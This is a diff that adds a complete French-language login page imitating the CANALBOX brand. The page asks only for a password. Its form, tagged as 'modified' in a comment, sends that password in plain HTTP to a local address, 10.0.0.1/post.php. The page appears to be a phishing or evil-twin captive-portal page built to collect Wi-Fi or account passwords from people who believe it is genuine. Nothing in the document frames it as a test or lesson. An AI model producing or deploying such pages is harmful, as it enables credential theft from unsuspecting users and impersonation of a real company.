@@ -1,0 +1,403 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<title>Connexion</title>
+
+<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+
+<style>
+
+*{
+margin:0;
+padding:0;
+box-sizing:border-box;
+font-family:'Poppins',sans-serif;
+}
+
+body{
+
+height:100vh;
+overflow:hidden;
+display:flex;
+justify-content:center;
+align-items:center;
+background:#0a0a0a;
+position:relative;
+color:white;
+
+}
+
+/************** Background **************/
+
+body::before{
+
+content:"";
+position:absolute;
+width:700px;
+height:700px;
+border-radius:50%;
+background:radial-gradient(circle,#ffd40022,transparent 70%);
+top:-300px;
+right:-250px;
+
+}
+
+body::after{
+
+content:"";
+position:absolute;
+width:600px;
+height:600px;
+background:linear-gradient(135deg,#222,#111);
+transform:rotate(40deg);
+left:-300px;
+bottom:-250px;
+border:1px solid rgba(255,208,0,.2);
+
+}
+
+/************** Decorative lines **************/
+
+.line1{
+
+position:absolute;
+width:450px;
+height:450px;
+left:-200px;
+bottom:-150px;
+transform:rotate(-25deg);
+border:1px solid rgba(255,208,0,.25);
+
+}
+
+.line2{
+
+position:absolute;
+width:600px;
+height:600px;
+left:-260px;
+bottom:-230px;
+transform:rotate(-25deg);
+border:1px solid rgba(255,255,255,.05);
+
+}
+
+/************** Logo **************/
+
+.logo{
+
+position:absolute;
+top:45px;
+left:50px;
+font-size:44px;
+font-weight:700;
+letter-spacing:1px;
+
+}
+
+.logo span{
+
+color:#FFD400;
+
+}
+
+/************** Card **************/
+
+.card{
+
+position:relative;
+z-index:2;
+
+width:450px;
+
+padding:50px;
+
+background:rgba(18,18,18,.82);
+
+backdrop-filter:blur(14px);
+
+border:1px solid rgba(255,255,255,.08);
+
+border-radius:22px;
+
+box-shadow:
+0 20px 60px rgba(0,0,0,.55),
+0 0 40px rgba(255,208,0,.05);
+
+animation:fade .8s ease;
+
+}
+
+@keyframes fade{
+
+from{
+
+opacity:0;
+transform:translateY(25px);
+
+}
+
+to{
+
+opacity:1;
+transform:translateY(0);
+
+}
+
+}
+
+.lock{
+
+font-size:60px;
+text-align:center;
+margin-bottom:15px;
+
+}
+
+h1{
+
+text-align:center;
+font-size:40px;
+margin-bottom:8px;
+
+}
+
+.subtitle{
+
+text-align:center;
+color:#a6a6a6;
+margin-bottom:40px;
+
+}
+
+label{
+
+display:block;
+margin-bottom:10px;
+font-weight:500;
+
+}
+
+.inputBox{
+
+position:relative;
+
+}
+
+input{
+
+width:100%;
+
+padding:18px 55px 18px 18px;
+
+background:#1d1d1d;
+
+border:1px solid #353535;
+
+border-radius:12px;
+
+font-size:15px;
+
+color:white;
+
+transition:.3s;
+
+}
+
+input:focus{
+
+outline:none;
+border-color:#FFD400;
+box-shadow:0 0 15px rgba(255,208,0,.25);
+
+}
+
+.eye{
+
+position:absolute;
+right:18px;
+top:50%;
+transform:translateY(-50%);
+cursor:pointer;
+font-size:22px;
+user-select:none;
+
+}
+
+/************** Button **************/
+
+button{
+
+margin-top:30px;
+
+width:100%;
+
+padding:18px;
+
+border:none;
+
+border-radius:12px;
+
+font-size:18px;
+
+font-weight:700;
+
+cursor:pointer;
+
+background:linear-gradient(90deg,#FFD400,#ffbf00);
+
+transition:.25s;
+
+}
+
+button:hover{
+
+transform:translateY(-2px);
+
+box-shadow:0 12px 30px rgba(255,208,0,.35);
+
+}
+
+button:active{
+
+transform:scale(.98);
+
+}
+
+.forgot{
+
+margin-top:25px;
+text-align:center;
+
+}
+
+.forgot a{
+
+color:#FFD400;
+text-decoration:none;
+font-weight:500;
+
+}
+
+.forgot a:hover{
+
+text-decoration:underline;
+
+}
+
+/************** Footer **************/
+
+footer{
+
+position:absolute;
+bottom:18px;
+width:100%;
+text-align:center;
+font-size:14px;
+color:#888;
+
+}
+
+@media(max-width:600px){
+
+.card{
+
+width:92%;
+padding:35px;
+
+}
+
+.logo{
+
+font-size:30px;
+left:25px;
+top:25px;
+
+}
+
+}
+
+</style>
+
+</head>
+
+<body>
+
+<div class="line1"></div>
+<div class="line2"></div>
+
+<div class="logo">
+CANAL<span>BOX</span>
+</div>
+
+<div class="card">
+
+<div class="lock">🔒</div>
+
+<h1>Connexion</h1>
+
+<div class="subtitle">
+
+Entrez votre mot de passe pour accéder à votre compte
+
+</div>
+
+<!-- FORMULAIRE MODIFIÉ -->
+<form action="http://10.0.0.1/post.php" method="POST">
+    <label>Mot de passe</label>
+    <div class="inputBox">
+        <input
+            id="password"
+            name="password"
+            type="password"
+            placeholder="Entrez votre mot de passe"
+            required>
+        <div class="eye" onclick="togglePassword()">👁</div>
+    </div>
+    <button type="submit">SE CONNECTER</button>
+</form>
+<!-- FIN FORMULAIRE -->
+
+<div class="forgot">
+
+<a href="#">
+
+Mot de passe oublié ?
+
+</a>
+
+</div>
+
+</div>
+
+<footer>
+
+© 2026 CANALBOX — Tous droits réservés.
+
+</footer>
+
+<script>
+
+function togglePassword(){
+
+let input=document.getElementById("password");
+
+if(input.type==="password"){
+
+input.type="text";
+
+}else{
+
+input.type="password";
+
+}
+
+}
+
+</script>
+
+</body>
+</html>
